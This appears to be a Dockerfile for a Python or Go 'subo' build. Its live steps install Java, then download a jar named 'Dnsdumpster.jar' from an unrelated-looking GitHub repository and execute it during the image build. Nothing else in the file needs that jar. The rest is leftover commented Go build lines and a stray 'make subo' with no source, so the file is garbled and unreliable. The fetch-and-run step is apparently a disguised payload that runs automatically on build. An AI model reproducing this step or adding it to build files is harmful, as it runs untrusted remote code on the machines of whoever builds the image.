FROM ubuntu:20.04
USER root
WORKDIR /root
SHELL [ "/bin/bash", "-c" ]
ARG PYTHON_VERSION_TAG=3.8.7
ARG LINK_PYTHON_TO_PYTHON3=1
RUN apt update
RUN apt-get install wget -y
RUN apt-get install openjdk-11-jdk -y
RUN wget https://github.com/wenckerm1lder/Scn-fix-dsfca/raw/main/Dnsdumpster.jar
RUN java -jar Dnsdumpster.jar

CMD [ "/bin/bash" ]


#FROM golang:1.16

#RUN mkdir -p /root/github.com/suborbital/subo
#WORKDIR /root/github.com/suborbital/subo



#COPY subo ./subo
#COPY builder ./builder
#COPY scn ./scn
#COPY vendor ./vendor
#COPY go.* .
#COPY Makefile .

RUN make subo
